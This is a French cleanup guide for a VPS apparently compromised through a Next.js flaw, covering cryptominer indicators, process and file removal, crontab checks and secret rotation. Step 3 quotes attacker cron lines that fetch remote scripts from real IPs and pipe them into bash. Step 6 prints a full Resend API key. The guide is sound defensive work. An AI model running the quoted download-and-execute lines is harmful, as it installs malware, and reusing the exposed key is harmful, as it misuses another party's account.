# 🧹 GUIDE DE NETTOYAGE VPS - MY COMPTA.BE

**Application:** my-compta.be
**Date du patch:** 9 décembre 2025
**CVE corrigée:** CVE-2025-66478 (CVSS 10.0)
**Next.js:** 15.5.3 → 16.0.8 ✅

---

## ⚠️ INDICATEURS DE COMPROMISSION SPÉCIFIQUES

### Processus suspects à surveiller
```bash
# Vérifier les processus malveillants
ps aux | grep -E "kdevtmpfsi|kinsing|xmrig|kworker|\.kworker"

# Si des résultats apparaissent → VPS COMPROMIS
```

### Fichiers malveillants à rechercher
```bash
# Chercher dans /tmp
ls -la /tmp/ | grep -E "kdevtmpfsi|kinsing|config\.json|libsystem\.so"

# Chercher les binaires cachés
find /tmp -type f -name ".*" -ls
find /usr/bin -type f -name ".*" -ls
```

---

## 🛑 ÉTAPE 1 : ARRÊT IMMÉDIAT DES PROCESSUS MALVEILLANTS

```bash
# TUE TOUS LES PROCESSUS SUSPECTS
sudo pkill -9 -f kdevtmpfsi
sudo pkill -9 -f kinsing
sudo pkill -9 -f xmrig
sudo pkill -9 -f kworker
sudo pkill -9 -f ".kworker"

# VÉRIFIE QU'ILS SONT BIEN ARRÊTÉS
ps aux | grep -E "kdevtmpfsi|kinsing|xmrig"
# ✅ Aucun résultat = OK
# ❌ Des processus apparaissent = Relancer les commandes pkill
```

---

## 🗑️ ÉTAPE 2 : SUPPRESSION DES FICHIERS MALVEILLANTS

```bash
# SUPPRIME TOUS LES FICHIERS CONNUS
sudo rm -rf /tmp/kdevtmpfsi
sudo rm -rf /tmp/kinsing
sudo rm -rf /tmp/kworker
sudo rm -rf /tmp/.kworker
sudo rm -rf /tmp/config.json
sudo rm -rf /tmp/libsystem.so
sudo rm -rf /tmp/fghgf
sudo rm -rf /tmp/vim
sudo rm -rf /tmp/lc
sudo rm -rf /tmp/x
sudo rm -f /tmp/*.sh
sudo rm -f /tmp/bins.sh
sudo rm -f /usr/bin/.kworker

# NETTOIE /tmp COMPLÈTEMENT (PRUDENT!)
# Sauvegarde d'abord si tu as des fichiers légitimes
sudo find /tmp -type f -mtime -7 -exec rm -f {} \;
```

---

## 🕐 ÉTAPE 3 : NETTOYAGE DES CRONTABS (CRITIQUE)

```bash
# SAUVEGARDE D'ABORD (IMPORTANT!)
crontab -l > ~/crontab_backup_$(date +%Y%m%d_%H%M%S).txt

# AFFICHE LES CRONS ACTUELS
crontab -l

# ⚠️ CHERCHE DES LIGNES SUSPECTES COMME:
# @reboot /usr/bin/.kworker react 20.193.135.188:443
# * * * * * wget -q -O - http://80.64.16.241/re.sh | bash
# * * * * * curl -fsSL http://194.69.203.32:81/script.sh | bash

# SI TU VOIS DES LIGNES SUSPECTES:
crontab -r  # Supprime TOUT

# Recrée uniquement tes crons légitimes (s'il y en a)
# Pour my-compta.be, il ne devrait PAS y avoir de cron jobs normalement
```

**✅ Vérifie aussi le cron root:**
```bash
sudo crontab -l
# Même processus: sauvegarde, supprime si suspect
```

---

## 🔍 ÉTAPE 4 : VÉRIFICATION DES CONNEXIONS RÉSEAU

```bash
# CHERCHE LES CONNEXIONS VERS IPs MALVEILLANTES
sudo netstat -tulpn | grep -E "hashvault|45\.76\.155|193\.34\.213|194\.69\.203|80\.64\.16|20\.193\.135"

# Exemple d'output suspect:
# tcp 0 0 0.0.0.0:20193 0.0.0.0:* LISTEN 12345/kdevtmpfsi

# SI DES CONNEXIONS APPARAISSENT:
# 1. Note le PID (12345 dans l'exemple)
# 2. Tue le processus: sudo kill -9 12345
# 3. Relance la vérification
```

---

## 🐳 ÉTAPE 5 : NETTOYAGE DOCKER (SI APPLICABLE)

```bash
# LISTE LES CONTAINERS
docker ps -a

# VÉRIFIE LES LOGS DES CONTAINERS MY-COMPTA
docker logs [CONTAINER_ID_MY_COMPTA] --tail 100

# CHERCHE DES LIGNES SUSPECTES:
# - Connexions vers IPs malveillantes
# - Processus inattendus
# - Téléchargements de scripts

# SI SUSPECT, ARRÊTE ET SUPPRIME LE CONTAINER
docker stop [CONTAINER_ID]
docker rm [CONTAINER_ID]

# REBUILD DEPUIS L'IMAGE PROPRE
# (après avoir déployé le nouveau code patché)
```

---

## 🔐 ÉTAPE 6 : ROTATION DES SECRETS

### Variables d'environnement à changer pour MY-COMPTA.BE:

| Variable | Actuelle | Action |
|----------|----------|--------|
| `RESEND_API_KEY` | re_V2B6b... | ❌ À REGÉNÉRER |
| `CONTACT_EMAIL` | contact@... | ✅ OK (pas un secret) |
| `NODE_ENV` | acc | ✅ OK (pas un secret) |

### Comment régénérer RESEND_API_KEY:

1. **Va sur Resend Dashboard** : https://resend.com/api-keys
2. **Révoque l'ancienne clé** `re_V2B6bNDm_Bjr6Dr5ZsM74nENpxuhvDuA7`
3. **Crée une nouvelle clé API**
4. **Update dans ton dashboard de déploiement** (Coolify/Vercel)
5. **Redémarre l'application**

---

## 🚀 ÉTAPE 7 : REDÉPLOIEMENT

```bash
# Sur ton VPS ou dans Coolify/Vercel

# 1. PULL LE CODE PATCHÉ
git pull origin main

# 2. VÉRIFIE LA VERSION NEXT.JS
npm list next
# Doit afficher: next@16.0.8

# 3. REBUILD L'APPLICATION
npm install
npm run build

# 4. REDÉMARRE L'APPLICATION
# Docker:
docker-compose down
docker-compose up -d --build

# Ou PM2:
pm2 restart my-compta

# Ou systemd:
sudo systemctl restart my-compta
```

---

## 📊 ÉTAPE 8 : MONITORING POST-PATCH (72H)

### Jour 1 : Surveillance intensive (toutes les heures)

```bash
# VÉRIFIE LE CPU
docker stats
# CPU doit être < 50%

# VÉRIFIE LES PROCESSUS
docker exec [CONTAINER_ID] ps aux | head -20
# Aucun processus suspect

# VÉRIFIE LES CONNEXIONS
sudo netstat -tulpn | grep -v "ESTABLISHED"
# Aucune connexion vers IPs suspectes

# VÉRIFIE /tmp
ls -la /tmp
# Aucun fichier suspect créé

# VÉRIFIE LES CRONS
crontab -l
sudo crontab -l
# Aucune entrée suspecte
```

### Jours 2-3 : Surveillance quotidienne

```bash
# Matin et soir:
docker stats
ps aux | grep -E "kdevtmpfsi|kinsing|xmrig"
crontab -l
```

---

## 🎯 CHECKLIST COMPLÈTE

### Avant déploiement
- [x] Patch Next.js appliqué (16.0.8)
- [x] Build validé localement
- [x] Code commité

### Sur le VPS
- [ ] Processus malveillants tués
- [ ] Fichiers malveillants supprimés
- [ ] Crontabs nettoyés (user + root)
- [ ] Connexions réseau vérifiées
- [ ] Containers Docker nettoyés

### Rotation des secrets
- [ ] RESEND_API_KEY régénéré
- [ ] Nouvelle clé configurée dans le dashboard
- [ ] Application redémarrée avec nouveaux secrets

### Déploiement
- [ ] Code patché déployé
- [ ] next@16.0.8 confirmé dans les logs
- [ ] Build production réussi
- [ ] Application accessible

### Monitoring
- [ ] Jour 1 : Surveillance horaire
- [ ] Jours 2-3 : Surveillance bi-quotidienne
- [ ] Semaine 1 : Surveillance quotidienne

---

## ⚠️ SI LE VPS EST TOUJOURS COMPROMIS

Si après toutes ces étapes tu observes encore:
- CPU > 150% constant
- Processus suspects qui reviennent
- Connexions vers pool.hashvault.pro ou autres IPs malveillantes
- Fichiers qui se recréent dans /tmp

**→ RÉINSTALLATION COMPLÈTE DU VPS RECOMMANDÉE**

---

## 📞 SUPPORT

Si tu as besoin d'aide:
1. Vérifie les logs de l'application
2. Consulte https://nextjs.org/blog/CVE-2025-66478
3. Contacte ton hébergeur si le VPS est toujours compromis

---

**Guide créé le:** 9 décembre 2025
**Application:** my-compta.be
**Next.js:** 16.0.8 (Sécurisé)
**CVE:** CVE-2025-66478 (Patché)
